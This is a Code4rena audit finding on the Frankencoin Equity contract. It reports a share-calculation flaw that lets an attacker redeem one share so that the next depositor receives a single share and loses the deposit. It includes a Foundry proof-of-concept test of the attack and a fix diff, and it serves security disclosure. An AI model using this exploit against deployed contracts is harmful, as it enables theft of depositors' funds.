## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- satisfactory
- selected for report
- sponsor acknowledged
- M-03

# [Manipulation of total share amount might cause future depositors to lose their assets](https://github.com/code-423n4/2023-04-frankencoin-findings/issues/915) 

# Lines of code

https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L266-L270


# Vulnerability details

## Bug Description

In the `Equity` contract, the `calculateSharesInternal()` function is used to determine the amount of shares minted whenever a user deposits Frankencoin:

[Equity.sol#L266-L270](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L266-L270)

```solidity
function calculateSharesInternal(uint256 capitalBefore, uint256 investment) internal view returns (uint256) {
    uint256 totalShares = totalSupply();
    uint256 newTotalShares = totalShares < 1000 * ONE_DEC18 ? 1000 * ONE_DEC18 : _mulD18(totalShares, _cubicRoot(_divD18(capitalBefore + investment, capitalBefore)));
    return newTotalShares - totalShares;
}
```

Note that the return value is the amount of shares minted to the depositor. 

Whenever the total amount of shares is less than `1000e18`, the depositor will receive `1000e18 - totalShares` shares, regardless of how much Frankencoin he has deposited. This functionality exists to mint `1000e18` shares to the first depositor.

However, this is a vulnerability as the total amount of shares can decrease below `1000e18` due to the `redeem()` function, which burns shares: 

[Equity.sol#L275-L278](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L275-L278)

```solidity
function redeem(address target, uint256 shares) public returns (uint256) {
    require(canRedeem(msg.sender));
    uint256 proceeds = calculateProceeds(shares);
    _burn(msg.sender, shares);
```

The following check in `calculateProceeds()` only ensures that `totalSupply()` is never below `1e18`:

[Equity.sol#L293](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L293)

```solidity
require(shares + ONE_DEC18 < totalShares, "too many shares"); // make sure there is always at least one share
```

As such, if the total amount of shares decreases below `1000e18`, the next depositor will receive `1000e18 - totalShares` shares instead of an amount of shares proportional to the amount of Frankencoin deposited. This could result in a loss or unfair gain of Frankencoin for the depositor.

## Impact

If the total amount of shares ever drops below `1000e18`, the next depositor will receive a disproportionate amount of shares, resulting in an unfair gain or loss of Frankencoin.

Moreover, by repeatedly redeeming shares, an attacker can force the total share amount remain below `1000e18`, causing all future depositors to lose most of their deposited Frankencoin.  

## Proof of Concept

Consider the following scenario:
- Alice deposits 1000 Frankencoin (`amount = 1000e18`), gaining `1000e18` shares in return.
- After 90 days, Alice is able to redeem her shares. 
- Alice calls `redeem()` with `shares = 1` to redeem 1 share:
  - The total amount of shares is now `1000e18 - 1`.
- Bob deposits 1000 Frankencoin (`amount = 1000e18`). In `calculateSharesInternal()`:
  - `totalShares < 1000 * ONE_DEC18` evalutes to true.
  - Bob receives `newTotalShares - totalShares = 1000e18 - (1000e18 - 1) = 1` shares.

Although Bob deposited 1000 Frankencoin, he received only 1 share in return. As such, all his deposited Frankencoin can be redeemed by Alice using her shares. Furthermore, Alice can cause the next depositor after Bob to also receive 1 share by redeeming 1 share, causing the total amount of shares to become `1000e18 - 1` again.

Note that the attack described above is possbile as long as an attacker has sufficient shares to decrease the total share amount below `1000e18`.

The following Foundry test demonstrates the scenario above:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../contracts/Frankencoin.sol";

contract ShareManipulation_POC is Test {
    Frankencoin zchf;
    Equity reserve;
    
    address ALICE = address(0x1);
    address BOB = address(0x2);

    function setUp() public {
        // Setup contracts
        zchf = new Frankencoin(10 days);
        reserve = Equity(address(zchf.reserve()));

        // Give both ALICE and BOB 1000 Frankencoin
        zchf.suggestMinter(address(this), 0, 0, "");
        zchf.mint(ALICE, 1000 ether);
        zchf.mint(BOB, 1000 ether);
    }

    function test_NextDepositorGetsOneShare() public {
        // ALICE deposits 1000 Frankencoin, getting 1000e18 shares
        vm.prank(ALICE);
        zchf.transferAndCall(address(reserve), 1000 ether, "");

        // Time passes until ALICE can redeem
        vm.roll(block.number + 90 * 7200);

        // ALICE redeems 1 share, leaving 1000e18 - 1 shares remaining
        vm.prank(ALICE);
        reserve.redeem(ALICE, 1);
        
        // BOB deposits 1000 Frankencoin, but gets only 1 share
        vm.prank(BOB);
        zchf.transferAndCall(address(reserve), 1000 ether, "");
        assertEq(reserve.balanceOf(BOB), 1);

        // All of BOB's deposited Frankencoin accrue to ALICE
        vm.startPrank(ALICE);
        reserve.redeem(ALICE, reserve.balanceOf(ALICE) - 1e18);
        assertGt(zchf.balanceOf(ALICE), 1999 ether);
    }
}
```

## Recommendation

As the total amount of shares will never be less than `1e18`, check if `totalShares` is less than `1e18` instead of `1000e18` in `calculateSharesInternal()`:

[Equity.sol#L266-L270](https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L266-L270)

```diff
     function calculateSharesInternal(uint256 capitalBefore, uint256 investment) internal view returns (uint256) {
         uint256 totalShares = totalSupply();
-         uint256 newTotalShares = totalShares < 1000 * ONE_DEC18 ? 1000 * ONE_DEC18 : _mulD18(totalShares, _cubicRoot(_divD18(capitalBefore + investment, capitalBefore)));
+         uint256 newTotalShares = totalShares < ONE_DEC18 ? 1000 * ONE_DEC18 : _mulD18(totalShares, _cubicRoot(_divD18(capitalBefore + investment, capitalBefore)));
         return newTotalShares - totalShares;
     }
```

This would give `1000e18` shares to the initial depositor and ensure that subsequent depositors will never receive a disproportionate amount of shares.